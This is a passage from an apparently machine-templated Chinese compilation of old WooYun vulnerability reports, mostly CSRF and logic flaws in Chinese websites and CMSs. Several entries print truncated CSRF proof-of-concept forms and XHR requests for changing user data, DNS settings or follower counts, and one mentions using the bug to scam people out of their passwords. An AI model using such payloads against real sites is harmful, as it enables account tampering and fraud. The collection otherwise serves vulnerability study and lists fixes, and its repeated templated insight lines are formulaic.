3. 验证漏洞响应

**详情**: 进入设置中心，修改用户个人信息：查看数据包：可以看到，无不可预测参数，故伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5%BC%A0%E4%B8%89&domicileId=110103&address=fdgfdahet&zip=111111&telephone=13

**POC**: poc########伪造恶意链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2015-0155729] 维信现贷任意账号密码重置
**厂商**: vcash.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Host: www.vcash.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acce

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强验证
---

---
### [wooyun-2015-0124972] 美图商城CSRF修改收货地址
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ~~

**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="consignee&#95;name" value="?&#142;&#187;?&#142;&#187;?&#142;&#187;" /><input type="hidden" name="phone" value="18888888888" /><input type="hidden" name="province" value="15" /><input type="hidde

**绕过**: 直接利用

**修复**: token验证哦
---

---
### [wooyun-2015-0100229] YOHO!有货官方网站某功能设计缺陷导致跨站请求伪造(CSRF)（附带poc）
**厂商**: YOHO!有货 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: YOHO!有货官方网站save address设计接口缺陷导致跨站请求伪造(CSRF)（附带poc）。

**POC**: poc：<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>CSRF跨站请求伪造安全漏洞POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="addressee_name" value="乌云@安然意境"/><input type="hidden" name="address" value=

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2012-012968] PHPWIND 8.7 手机版 CSRF
**厂商**: 某论坛系统 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 手机版“退出”链接为 index.php?a=quit帖子内容写：[img]http://xxxxxxx/m/index.php?a=quit[/img]看帖后即被退出

**POC**: 本地测试成功退出

**绕过**: 直接利用

**修复**: 抄袭下discuz，加个formhash
---

---
### [wooyun-2014-062848] MetInfo设计缺陷导致删除整站等严重漏洞全版本通杀
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 那官方最新版metinfo5.2测试！第一处：任意目录删除文件出在/admin/system/uploadfile.php<?php# MetInfo Enterprise Content Management System# Copyright (C) MetInfo Co.,Ltd (https://example.com/[已脱敏]). All rights reserved.require_once '../login/login_check.php';require_once 'mydir.class.php';$rurls='../system/uploadfile.php?anyid='.$anyid.'&cs='.$cs.'&lang='.$lang;if($action=='deletefolder'){$filedir="../../".$filename;deldir($fi

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 控制删除的目录。添加CSRF Token
---

---
### [wooyun-2015-0118491] 爱丽网漏洞小礼包(多处csrf)
**厂商**: aili.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 1.爱丽网漏洞小礼包（二），爱丽厂商我又来了！废话就不多说了，一个GET提交方式的CSRF漏洞。写日志的地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 爱丽厂商。您好，您上次索要我的联系方式不小心给我点到删除了，麻烦再索要一次！
---

---
### [wooyun-2014-053771] Discuz! X2.5 / X3 / X3.1中CSRF攻击防御可被绕过
**厂商**: Discuz! | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: discuz在判断表单时用这个函数：submitcheck('submit', true)其中第二个参数本来应该是是否允许GET请求的选项。在X2.5 / X3 / X3.1中，第二个参数为true时竟然不判断formhash直接return true了……使用批量搜索工具搜索discuz源代码里的submitcheck(*, *)……然后发现官方也用了这种写法，尿了尿了另外表示X2和之前的都没看过，不确定是否有问题。 我本地的X2.5 X3 X3.1这个文件基本都一样……

**POC**: source/class/helper/helper_form.phpLine 22if($allowget || ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_GET['formhash']) && $_GET['formhash'] == formhash() && empty($_SERVER['HTTP_X_FLASH_VERSION']) && (empty($_SERVER['HTTP_REFERER']) ||preg_replace("/https?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER[

**绕过**: 直接利用

**修复**: 最简单的办法，修改下这个判断语句的逻辑吧
---

---
### [wooyun-2015-0135490] 爱旅行某处csrf可修改用户信息/常用地址/常用联系人等
**厂商**: ilvxing.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改个人信息处未加token验证，也未验证refer构造poc<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="phone" value="13088643071" /><input type="hidden" name="email" value="1&#64;q&#46;cc" /><input type="hidden" name="old&#95;password" value="" /><input type="hidden" name="new&#95;password" value="" /><input type="hidden" name="new&#95;password&#95;c

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加token和验证refer
---

---
### [wooyun-2013-044252] 某互联网公司照片墙一处csrf漏洞(已证明)
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 果然点进来了，然后他不鸟我了，我洗澡出来后刷新下，艾玛，没有了

**POC**: 果然点进来了，然后他不鸟我了，我洗澡出来后刷新下，艾玛，没有了

**绕过**: 直接利用

**修复**: 1：get转换成post数据并token2：危害：小孩的照片是指的珍藏的，她可能没备份，伤心了，事后我也会去道歉。。。毕竟是孩子小时候的回忆，某互联网公司伤不起啊
---

---
### [wooyun-2013-032723] 看我如重置暴风影音账户密码（需要与用户互交）
**厂商**: 暴风影音 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、问题出现在个人中心的邮件验证功能上：https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 最主要的防止scrf就好了
---

---
### [wooyun-2011-03393] 某视频网站网存在CSRF漏洞
**厂商**: 某视频网站 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无限制顶或者踩一个视频

**POC**: https://example.com/[已脱敏]"videoId": "XMzE1ODYzOTEy", "type": "down"}修改其中的down为up，再url编码，访问这个链接就可以顶一票，可以无限制的踩或者顶https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 修改为post请求，添加秘密信息，一次一生成
---

---
### [wooyun-2010-0198] 豆瓣电台认证绕过及csrf防范策略绕过漏洞
**厂商**: 豆瓣 | **年份**: 2010 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 豆瓣电台的认证如下：https://example.com/[已脱敏]'https://example.com/[已脱敏]';其中的sig将作为主要的认证，而直接

**POC**: <script src="https://example.com/[已脱敏]" from="80sec"></script>

**绕过**: 过滤绕过

**修复**: 修改认证方案或者加强对访问url的校验
---

---
### [wooyun-2015-0108586] 试玩网可修改他人用户信息(csrf)
**厂商**: www.shiwan.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 当前用户构造表单修改后

**POC**: 利用期当前会话 修改信息，鸡肋了点 得修改他id  缺wb

**绕过**: 直接利用

**修复**: 严重来源 随机token
---

---
### [wooyun-2013-017169] 某社交平台某社交平台又一处CSRF刷粉丝
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 没有对referer验证，没有加token导致

**POC**: 登录某社交平台某社交平台社会招聘：https://example.com/[已脱敏] id="fxx" name="fxx" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></html>

**绕过**: 直接利用

**修复**: 1.这个站同样也是CSRF不设防哦，请做好其他检查；2.检查POST来路Referer，在POST的信息中加token；3.要新年了，求礼物啊！
---

---
### [wooyun-2013-026286] 没有粉丝的来ELLE中国吧！
**厂商**: ellechina.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1：加关注为此申请了两个号；id分别为丁凌、丁凌0；2：点击加关注抓包拦截，发现这是个GET请求，并且2200458就是用户的id号，并且没有校验referer：3：那就可以直接构造一个刷粉丝请求了：

**POC**: 4：即可关注我了：

**绕过**: 直接利用

**修复**: 校验referer，加token
---

---
### [wooyun-2013-017347] 我是如何刷某社交平台粉丝的
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.今天用了某社交平台，虽然功能少点但也很nice嘛！想不到我封存了5年的某互联网公司账号还在，密码也没被盗！恩，不扯了，是一个加关注的接口存在问题呢！look：https://example.com/[已脱敏]

**POC**: 3.使用IE浏览器登录另一个新申请的账号：找到刚才风萧萧吸童鞋准备好的链接，点击即可，返回如下：当然效果也有了：4.其实不用这么麻烦，该接口没有对CSRF做任何的防范，直接点击访问就会中招！但是我为了说明这种GET方式的请求，即使验证了referer，也无济于事。后面的漏洞会精彩的如果有续集的话！

**绕过**: 直接利用

**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给某互联网公司找洞，要鼓励这种舍己为人的精神啊！春天妹子啊送个公仔撒！
---

---
### [wooyun-2015-0162486] 点我的链接我就可能会进入你的51cto账号
**厂商**: 51CTO技术网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 51cto的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2015-0151798] 奇酷商城CSRF添加收货地址
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="id" value="" /><input type="hidden" name="receiver" value="fsdf" /><input type="hidden" name="mobilePhone" value="13888888888" /><input type="hidden" name="telPhone" value="" /><input type="hidden" name="provinceId" value="260" /><input type="hid

**POC**: (见原文)

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2014-060493] 蚂蜂网-某社交平台 OAuth 2.0 redirect_uri CSRF 漏洞
**厂商**: 蚂蜂窝 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蚂蜂网-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个蚂蜂网-某社交平台  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏] 蚂蜂网会自动将用户的帐号同攻击者的帐号绑定到一起

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0125767] 美图秀秀旗下网站美拍CSRF漏洞（刷转发量）
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 跟上个刷关注一样，同样是没增加token请看抓包附上POC我们换个帐号登录，然后访问poc

**POC**: 访问成功，转发成功

**绕过**: 直接利用

**修复**: 增加token吧漏洞虽小 危害却大
---

---
### [wooyun-2014-072804] SiteServer_BBS_可CSRF发表主题+回帖
**厂商**: 百容千域软件技术开发有限责任公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发表主题和回帖的接口均存在问题/ajax/form.aspx?publishmentSystemID=1&action=addPost （回帖）/ajax/form.aspx?publishmentSystemID=1&action=postAllInOne （发表主题）直接发POC：1.回帖<meta http-equiv=Content-Type content="text/html;charset=utf-8"><form id="addPostForm" action="http://[IP已脱敏] method="post"><input id="forumID" name="forumID" type="hidden" value="2"><input id="thre

**POC**: 回帖：{"onlineTotal":"1 \u5206\u949F","userImageUrl":"/sitefiles/bairong/icons/avatars/atavar_middle_38.jpg","creationDate":"2014-08-16","prestige":0,"title":"CSRF TEST!","editUrl":"/post.aspx?forumID=2&threadID=1&postID=1011&postType=","userUrl":"/user.aspx?publishmentSystemID=1&userName=zphchina","er

**绕过**: 直接利用

**修复**: 加token并判断referer
---

---
### [wooyun-2015-092552] 商务中国CSRF漏洞
**厂商**: 商务中国 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 商务CSRF更改域名dns服务器，在用户不知情的情况下恶意更改域名解析

**POC**: 首先我们需要在商务中国，来进行测试，我们登录之后，我们任意找一处有修改权限的地方例如1、这里然后用burp截断又例如修改密码处，同样可以截断我们抓包发现，是POST型，且没有token验证机制，故我们可以构造csrf可以构造的提交页面（包括但不限于这几处）1、https://example.com/[已脱敏] 构造一个表单html页面1处填写域名 2 、3处写DNS地址OK  构造完成！以上是挖掘过程接下来是测试阶段，为了更好的演示效果，我们用另外一个小

**绕过**: 直接利用

**修复**: 加验证
---

---
### [wooyun-2014-060499] 百合-某搜索引擎 OAuth 2.0 redirect_uri CSRF 漏洞
**厂商**: 百合网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百合-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个百合-某搜索引擎  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-058804] 某互联网公司微社区CSRF漏洞2枚（可以刷粉丝和人气）
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一个CSRF漏洞（刷粉丝）：利用CSRF构造好的URL：（其中key为指定社区的id）https://example.com/[已脱敏] src=https://example.com/[已脱敏]"errCode":0,"message":"\u5df2\u9876","data":{"likeNumber":2},

**POC**: 如上

**绕过**: 直接利用

**修复**: 求忽略！
---

---
### [wooyun-2013-034681] 天涯某社交平台手机版CSRF刷粉丝
**厂商**: 天涯社区 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们关注uid=3615778的用户，看看加关注的请求：GET /action/follow.jsp?uid=3615778&vu=76821864657&idwriter=81847003&key=831533474&chk=635410373cd31bb22859f44a0a9ef60e HTTP/1.1Host: 3g.tianya.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, defl

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 防御csrf
---

---
### [wooyun-2013-043688] 大众点评—看看我是如何再次刷粉丝的
**厂商**: 大众点评 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] - 当然被限制了，好蛋疼的说https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] - 我表示程序猿工资一定很低https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1：控制好所有接口2：不要把输入输出自己弄在网页里3：来发礼物把。。
---

---
### [wooyun-2015-0162488] 点我的链接我就可能会进入你的聚美优品账号
**厂商**: 聚美优品 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 聚美优品的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2015-098349] 淘米校巴出现CSRF漏洞 可改个人资料自动关注自动转载
**厂商**: 淘米网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 已知受影响的操作：更改个人资料、更改个人兴趣爱好、设置空间名称/描述、关注/取消关注他人、发表/转载日记更改个人资料关注他人：更改个人兴趣爱好另外日记可插入站外图片URL，图片链接填短链接跳转可以绕过链接?问号过滤。配合此漏洞可造成日记无限转载，产生大量垃圾数据。

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 敏感操作不使用GET请求
---

---
### [wooyun-2013-017303] 我又是如何日刷千万某社交平台某社交平台粉丝的
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.好吧，有点标题党，但是确实是真实的事情！在说漏洞细节之前，先举报一张图撒，刷粉丝多挣钱啊：2.出问题的站点是：https://example.com/[已脱敏] /blog/api/attentionpost.php HTTP/1.1rialog=A0012&uid=【粉丝id】&aid=【关注的对象id】&name=【可以不填】&is_follower=【可以不填】上述两个参数中最重要的是uid，就是粉丝的id号，默认是本次请求的账户id，aid是关注的对象，也就是需要刷粉丝的那位客观！4.为了演示漏洞效果，这次我不帮乌云刷粉丝了，而是把乌云账号刷成我的粉丝（一是想说明漏洞的真实性：我不会去控制乌云某社交平台的对吧，二是提高乌云某社交平台的出镜率，希望大家通过正常手段去关注乌云）。大家还记的乌云uid号

**POC**: 7.如果我将本次POST的请求发送给burpsuite的intruder模块，uid设置成10位数字去遍历，我会日刷千万粉丝么？

**绕过**: 直接利用

**修复**: 我尝试了多少次的失败才有这一次的发现！
---

---
### [wooyun-2012-012539] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="product" value="weibo" /><input type="text" name="ac" value="send" /><input type="text" 

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2013-017487] DX2.5某处操作未验证HASH，可以CSRF快速刷分！
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 评分处未验证HASH，在个人签名或者回复内容中用插入图片功能插入评分链接，别人打开包含该图片的帖子就会自动给指定帖子加分了。[img]https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 验证HASH
---

---
### [wooyun-2014-074874] 柯林手机自助建站系统多方面通杀CSRF
**厂商**: 柯林手机自助建站系统 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎关键词inurl:wapindex.aspx柯林官方网站https://example.com/[已脱敏]  八门神器的作者网站、wapzz 手机站长之家下面开始示例了。就用www.wapzz.cn做例子后面加上admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0经过url编码得www.wapzz.cn/admin/addTopWAPALL.aspx?path=360%E5%BA%93%E5%B8%A6%E8%AE%A1%E5%88%92&action=gomod&classid=0管理员访问此链接，网站首页就会改为360库带计划。也可以直接使用简化链接www.wapzz.cn/admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0再比如这个ht

**POC**: 可构造链举例、https://example.com/[已脱敏]

**绕过**: 编码绕过

**修复**: 用户和管理员可操作的权限都可以构造CSRF链，你们这建站系统也太不负责了吧。该罚
---

---
### [wooyun-2014-049660] CSDN博客管理CSRF漏洞
**厂商**: CSDN开发者社区 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 删除文章url完全暴露给其他用户，都是这种形式：https://example.com/[已脱敏] B模拟）1.首先看A用户发表了一篇文章：https://example.com/[已脱敏]):3.但是，我们可以“猜”出这个删除文章的URL:CSDN博客删除文章的链接一般形

**POC**: 用户A点击用户B博客里的图片后，再去看这篇文章：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2014-076080] Discuz!X一个为所欲为的csrf+hpp(站点脱裤，任意文件文件操作，目录穿越，可能其他cms躺着中枪)
**厂商**: Discuz! | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞来自dz公司的ucenter，这个ucenter，应该是在数据库备份操作时候，没有做csrf防御可导致dz被文件操作，脱裤等等，开始分析：下来我们分析代码：uc_server\control\admin\db.php:(85-ll6行):function onoperate() {require_once UC_ROOT.'lib/xml.class.php';$nexturl = getgpc('nexturl');$appid = intval(getgpc('appid'));$type = getgpc('t') == 'import' ? 'import' : 'export';$backupdir = getgpc('backupdir');$app = $this->cache['apps'][$appid];if($nexturl) {$url = $nexturl;

**POC**: (见原文)

**绕过**: 过滤绕过, 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2015-0103414] 氧气APP CSRF可批量收藏
**厂商**: o2bra.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 收藏时候，POST如下请求：修改id=2：成功回执：

**POC**: 利用上一个漏洞，可查看任意id的关注商品的URL：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加token
---

---
### [wooyun-2013-038016] 某安全厂商某处功能csrf（店铺可刷收藏）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 这里还有一发可以骗人的。至于被黑帽子利用后干嘛我们就不知道了。 自慰的，但是可以骗那些不懂得。 被黑帽子利用就不好啦。。当然360你们也在反社工对吧，这个完全可以说是可以用到社工，就好比我帮userB骗他刷一个XXX， 金币为：998988   当然他会把账号密码发来，之后拉黑他，想干嘛就干嘛，说不定他里面还有金币，拿去积分抽奖， 淫荡的思路又开始了。。。社会工程学强大，不解释 通用密码的我也不介意， 你们客户的安全隐患。。。 你自己懂~  很多人为了钱什么都做，你懂得。。。

**绕过**: 直接利用

**修复**: 1：改成post提交，然后token ，以防被人csrf2：我还是来坑安仔。。。3：然后。。 没了。。 骗一个人完全可以说不是骗人，他会说是社工，你也没办法。。4:之前借用id互换，然后截图，还真有人以为是真的- - 我无语。。 大哥。iPad的诱惑对于90后应该挺大的
---

---
### [wooyun-2012-014880] 某搜索引擎游戏CSRF,加加好友什么的不是梦
**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: i游戏中，加好友,发布留言，未做csrf的检查，虽然使用post，但同样支持get。同时，对referer未做足够的检测。i游戏发留言，不支持图片和链接，所以，成为蠕虫还差最后一口气，不过通过论坛的配合，随意加好友，以及随意发布留言没有任何障碍。 进一步发掘，应该还有更多好玩的功能，我不试了，点到为止，你们自己排查吧。

**POC**: 1.加好友。 为方便，借游戏吧签名下手。2.看看游戏吧中的效果。3.看了这贴子的结果4.发留言同样csrf问题，我懒得再试了。

**绕过**: 直接利用

**修复**: 标准csrf处理流程了
---

---
### [wooyun-2010-0965] 某社交平台有个一键转发的发帖的csrf漏洞
**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
